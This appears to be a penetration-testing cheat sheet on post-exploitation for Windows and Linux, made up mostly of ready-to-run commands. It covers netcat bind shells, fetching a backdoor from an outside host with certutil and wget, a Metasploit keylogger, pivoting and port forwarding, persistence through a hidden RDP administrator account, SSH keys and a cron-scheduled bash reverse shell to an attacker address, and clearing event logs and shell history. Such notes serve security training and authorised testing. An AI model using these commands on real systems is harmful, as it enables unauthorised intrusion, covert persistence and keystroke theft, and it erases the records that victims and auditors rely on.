# Post-Exploitation

## General

### Bind Shell

This type of shell is not preferred as the attacker directly connects to the target system and in most cases, ingress traffic is always blocked or flagged as suspicious.

<pre class="language-sh"><code class="lang-sh"># Windows (target)
nc -nvlp &#x3C;port> -e cmd.exe 
nc.exe -nvlp &#x3C;port> -e cmd.exe

# Linux (target)
nc -nvlp &#x3C;port> -e /bin/bash

<strong># Linux (attacker)
</strong>nc -nv &#x3C;ip> &#x3C;port>

<strong>#Windows (attacker)
</strong>nc.exe -nv &#x3C;ip> &#x3C;port>
</code></pre>

### Transfer files

```sh
# HTTP Windows
certutil -urlcache -f http://<host>/backdoor.php backdoor.php
# HTTP Linux
wget http://<host>/backdoor.php

# Netcat
nc -nvlp 1234 > backdoor.php         # recepient
nc -nv <ip> <port> < backdoor.php    # sender
```

### Interactive shell

```sh
/bin/bash -i # Linux
```

### Fully interactive shell (python)

```sh
# 1 Step
python3 -c 'import pty;pty.spawn("/bin/bash")' 
python -c 'import pty;pty.spawn("/bin/bash")'

# 2 Step
CTRL + Z # Press CTRL + Z to background process and get back to your host machine

# 3 Step
stty raw -echo; fg

# 4 Step
export TERM=xterm
```

### Keylogger

```sh
# With metasploit
keyscan_start          # start keylogger
keyscan_dump print     # captured strokes
```

### Pivoting & Port forwarding

* Metasploit (in meterpreter)
  * `ipconfig` find subnet (the host may be in other network)
  * `run autoroute -s <subnet>`  (subnet of the internal network). **This means anytime we want to contact a machine within one of the networks specified, we will go through meterpreter session and use that to connect to the targets.**
    * Example:
      * `ipconfig`  IP 19.9.29.148. Netmask: 255.255.240.0
      * `run autoroute -s 10.10.0.29.0/20`
  * `run autoroute -p` Displays active routing table.
  * auxiliary/scanner/portscan/tcp : We can perform the scan. NOTE: scanning with metasploite is limited (we can't discover software version etc...) so it's better to use nmap. To do that we need to perform port forwarding.
  * **since target\_sys\_2 does not have a route back to attacker\_sys, use bind\_shell payload** : windows/meterpreter/bind\_tcp
* Port forwarding (meterpreter/metasploit)
  * `portfwd add -l 1234 -p 80 -r <target_sys_2_ip>`  Forward remote port to local port. In this case we want to scan the port 80 of the target 2
  * `portfwd list`
  * `nmap -sV -sC -p 1234 localhost`

## Windows

### Persistence

* Metasploit
  * search persistence module (Windows)
  * Ex: exploit/windows/local/persistence\_service
    * It will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
    * When you want to connect again you need to set a listener to receive the connection
* Enable RDP
  * with metasploit : search enable\_rdp (and set session)
    * Connect to victim from attacker
      * Note: you need username and password, if you don't have the password, change it `net user <username> <new_pass>` (suspicious in a real environment) or crack NTLM...
      * Note 2: you can create a new account and add it to administrator group...
  * second way with metasploit/meterpreter (auto create account and settings):
    * In meterpreter `run getgui -e -u user_you_want -p password_you_want`
      * enables rdp service -> creates new user with the provided parameters -> hides user from windows login screen -> adds user to Remote Desktop Users and Administrators group.

### Clearing tracks

```sh
# Metasploit/Meterpreter
clearev  # clear the Application, System, and Security logs on a Windows system
```

## Linux

### Persistence

* Metasploit
  * search persistence module (Linux)
    * Example: post/linux/manage/sshkey\_persistence (needed elevated privs - This module will add an SSH key to a specified user)
* Via SSH key
  * After gaining access to linux system, you can transfer SSH private key to local machine and use it to connect via SSH
* With cron jobs
  * Set up listener
  * `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > cron` create a cronjob (every minute time format)
  * `crontab -i cron`
  * `crontab -l`  crontab for the current user
  * NOTE: if the command doesn't work try with another one... revshell

### Clearing tracks

```sh
history -c                          # clear history
cat /dev/null > ~/.bash_history     # same as above
```
